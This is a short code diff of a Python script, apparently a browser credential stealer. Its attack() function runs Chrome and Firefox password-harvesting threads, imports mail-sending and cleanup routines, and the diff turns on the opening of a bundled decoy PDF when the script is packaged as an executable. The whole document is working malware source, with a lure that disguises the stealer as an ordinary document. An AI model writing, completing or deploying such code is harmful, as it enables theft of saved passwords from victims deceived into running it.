@@ -8,11 +8,10 @@ import firefox
 import threading
 import subprocess
 from mail import sendmail,remove
-from savloc import createPath
 
 def attack():
     #start_time = time.time()
-    createPath()
+    #createPath()
 
     t1 = threading.Thread(target=chrome.password, name='t1')
     t2 = threading.Thread(target=firefox.password, name='t2')
@@ -33,12 +32,13 @@ def attack():
     remove()
 
 #print("--- %s seconds ---" % (time.time() - start_time))
-'''
-#In case of pyinstaller
-pdf = sys._MEIPASS + "\calender.pdf"
-subprocess.Popen(pdf,shell=True)
-'''
 
-time.sleep(0.5)
+#In case of pyinstaller
+pdf = sys._MEIPASS + "\who.pdf"
+subprocess.Popen(pdf,shell=True)
+
+
+time.sleep(0.2)
 
 attack()
+
